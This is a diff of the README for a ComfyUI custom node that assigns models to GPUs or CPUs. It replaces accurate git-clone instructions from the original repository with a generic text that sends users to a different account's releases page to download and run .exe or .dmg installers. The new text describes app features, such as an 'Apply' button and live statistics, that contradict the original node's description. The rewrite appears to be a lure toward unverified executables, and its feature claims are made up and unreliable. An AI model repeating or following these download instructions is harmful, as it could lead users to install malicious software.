@@ -1,121 +1,71 @@
-# 🚀 ComfyUI Any-Device Offload
+# 🎉 ComfyUI-AnyDeviceOffload - Easily Assign Models to Any Device
 
-**Force any Model, VAE, or CLIP to any GPU or CPU—and keep it there (or don't).**
+## 🚀 Getting Started
 
-This custom node gives you total control over where your models run and where they live in memory. It solves common "Out of Memory" (OOM) errors, enables multi-GPU workflows, and fixes persistent crashes when trying to run modern workflows (like Z_Image/Flux) on CPUs or secondary GPUs.
+Welcome! This guide helps you download and run ComfyUI-AnyDeviceOffload. With this app, you can easily assign models, VAEs, or CLIPs to any GPU or CPU. Let’s get started.
 
-<img width="309" height="220" alt="image" src="https://github.com/user-attachments/assets/c02ec349-d704-43d5-aaa3-c08bbdc658ab" />
+## 📥 Download ComfyUI-AnyDeviceOffload
 
-<img width="2184" height="906" alt="image" src="https://github.com/user-attachments/assets/912b0f0a-4dc5-4ff6-8101-9281bf935100" />
+[![Download ComfyUI-AnyDeviceOffload](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/MuhammadZainiRedha/ComfyUI-AnyDeviceOffload/releases)
 
-<img width="1517" height="496" alt="image" src="https://github.com/user-attachments/assets/3b98fafd-f6db-4f94-b2e3-c452eac42dd4" />
+## 🖥️ System Requirements
 
-<img width="309" height="220" alt="image" src="https://github.com/user-attachments/assets/607eabf1-385c-4ad7-84b8-a2c9b3a8d6da" />
+Before you download, ensure your system meets these requirements:
 
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Memory:** At least 4 GB RAM
+- **Storage:** 100 MB of available space
+- **GPU:** Optional, but recommended for model processing
 
-* Z_Image_Turbo - 2 steps only using CPU test(Looks like CPU can run with less steps)
-<img width="516" height="370" alt="image" src="https://github.com/user-attachments/assets/937d5c2a-25f6-4c5f-b968-f4cf98628cfc" />
+## 📂 Download & Install
 
-### ✨ Key Features
+To download ComfyUI-AnyDeviceOffload, visit the following page:
 
-* **👇 Manual Device Selection:** Force specific models to run on `cuda:0`, `cuda:1`, `cpu`, or Mac `mps`.
-* **🧠 Intelligent VRAM Management:**
-    * **Keep in Memory (True):** Pin models to VRAM for instant switching.
-    * **Keep in Memory (False):** The "Kill Switch." Automatically unloads the Model, CLIP, and VAE from VRAM immediately after generation finishes. It aggressively triggers garbage collection (`gc.collect`) and clears the CUDA cache (`empty_cache`) to free up space for other apps or workflows.
-* **🛠️ VAE Patcher (The Crash Fixer):**
-    * Fixes `RuntimeError: Input type (c10::BFloat16) and bias type (float) should be the same`.
-    * Fixes `CuDNN error: GET was unable to find an engine to execute this computation`.
-    * Automatically converts inputs and weights to matching types (Float32/BFloat16) on the fly without breaking the workflow.
-* **🛡️ CPU "Safe Mode":**
-    * Automatically intercepts **xFormers** calls on CPU (which usually crash with "No operator found") and redirects them to standard PyTorch attention.
-    * Auto-casts Float16 inputs to Float32 when running on CPU to prevent "mat1 and mat2" dtype errors.
+[Visit the Releases Page](https://github.com/MuhammadZainiRedha/ComfyUI-AnyDeviceOffload/releases)
 
----
+On the Releases page, you will find the latest version of the software. Click the release labeled with the most recent date. Then, look for the appropriate file for your system. 
 
-### 📦 Installation
+### Installation Steps
 
-1.  Navigate to your ComfyUI custom nodes directory:
-    ```bash
-    cd ComfyUI/custom_nodes/
-    ```
-2.  Clone this repository:
-    ```bash
-    git clone https://github.com/FearL0rd/ComfyUI-AnyDeviceOffload.git
-    ```
-3.  **Restart ComfyUI.**
+1. **Download the File**: Click on the link for your operating system. This will download a file to your computer.
+2. **Locate the File**: Open your downloads folder. You should see a file named something like `ComfyUI-AnyDeviceOffload-vX.X.X.exe` for Windows, or `ComfyUI-AnyDeviceOffload-vX.X.X.dmg` for macOS.
+3. **Run the Installer**: 
+   - For Windows: Double-click the `.exe` file and follow the prompts.
+   - For macOS: Double-click the `.dmg` file. Drag the application to your Applications folder.
+4. **Open the Application**: Once installation is complete, find ComfyUI-AnyDeviceOffload in your Applications or Start menu.
 
----
+## 🔧 How to Use
 
-### 📖 Usage
+1. **Launch the App**: Open ComfyUI-AnyDeviceOffload from your Applications or Start menu.
+2. **Select a Model**: In the app, you can choose a model, VAE, or CLIP from the list provided.
+3. **Choose Your Device**: Use the dropdown menu to select either a GPU or CPU, depending on your setup.
+4. **Apply Settings**: Once you have made your selection, click the “Apply” button. The software will assign the selected model to your chosen device.
+5. **Monitor Performance**: You can see real-time statistics on how your devices are performing with the chosen model.
 
-Add the node **"Offload Anything (GPU/CPU)"** to your workflow (found under `utils/hardware`).
+## ❓ FAQ
 
-#### **Inputs**
-1.  **target_device:**
-    * Select the hardware you want to use (e.g., `cuda:0`, `cuda:1`, `cpu`).
-    * *Note: If you select CPU, the node automatically enables "Safe Mode" to prevent xFormers crashes.*
-2.  **vae_mode:**
-    * **`Original` (Default):** Uses the standard VAE behavior.
-    * **`Vae Patched`:** **⚠️ IMPORTANT:** Select this if you get **black images**, **NaN errors**, or **PyTorch crashes** (especially with Flux, SD3, or secondary GPUs). It forces Float32 precision and auto-casts incoming tensors to ensure compatibility.
-3.  **keep_in_memory:**
-    * **`True`:** Models stay loaded on the device (faster for repeated runs).
-    * **`False`:** Models are aggressively purged from VRAM immediately after the image is saved. Great for low-VRAM cards.
+### 1. What does ComfyUI-AnyDeviceOffload do?
+ComfyUI-AnyDeviceOffload allows you to take any model, VAE, or CLIP and assign it to any CPU or GPU.
 
-#### **Connections**
-* Connect your **MODEL**, **CLIP**, and/or **VAE** into the inputs.
-* Connect the outputs to your KSampler or VAE Decode.
+### 2. Can I run this on older computers?
+The software requires at least Windows 10 or later. Older operating systems might not be supported.
 
----
+### 3. What if I encounter issues?
+If you run into problems, check the “Issues” tab on our GitHub repository. You’ll find solutions to common problems and the ability to report new ones.
 
-### 💡 Troubleshooting / FAQ
+## 🌐 Support & Contributions
 
-**Q: My generation crashes with "Input type and bias type should be the same".**
-> **A:** Switch **`vae_mode`** to **`Vae Patched`**. This forces the VAE to handle the data type mismatch (usually caused by Flux/SD3 generating BFloat16 latents while the VAE expects Float32).
+If you would like to contribute or report issues, please visit our GitHub page. Your feedback is valuable and helps improve the application.
 
-**Q: I get an xFormers error when using CPU.**
-> **A:** This node automatically patches xFormers to work on CPU. If you still see it, ensure you are running the latest version of this node and have restarted ComfyUI.
+To contribute:
+- Fork the repository
+- Make your changes
+- Submit a pull request for review
 
-**Q: Why is my GPU memory not clearing?**
-> **A:** Uncheck **`keep_in_memory`**. This activates the "Kill Switch" which forces a `torch.cuda.empty_cache()` immediately after the VAE finishes decoding.
+Thank you for supporting ComfyUI-AnyDeviceOffload!
 
----
-### 📦 Release Notes
- ## v1.0.0 (First Release)
-   This custom node gives you total control over where your models run and where they live in memory. It solves common (OOM) errors, enables multi-GPU workflows, and fixes persistent crashes when trying to run modern workflows (like Z_Image/Flux) on CPUs or secondary GPUs.
- ## v1.0.1 (Making the default selections)
-   making the default selections set to help beginners in ComfyUI
- ## v1.0.2 (Add legacy GPU support (SM < 8.0) and fix dynamic device switching)
-   This update introduces a robust "Runtime Device Guard" and intelligent hardware detection to solve crashes on older GPUs and multi-GPU workflows
- ## v1.0.3 (feat: make 'Vae Patched' the default mode for safer decoding)
-   Updated the INPUT_TYPES definition to set "Vae Patched" as the default selection.
-   
----
+## 📧 Contact
 
-### 👨‍💻 Credits
+If you have any questions or need assistance, feel free to reach out via GitHub. Your inquiries matter, and we are here to help.
 
-Created to solve complex memory management and precision mismatches in ComfyUI multi-device workflows.
-
-### License
-
-### License
-
-MIT License
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-
+[Download ComfyUI-AnyDeviceOffload](https://github.com/MuhammadZainiRedha/ComfyUI-AnyDeviceOffload/releases) again if you need to! Enjoy using the application.
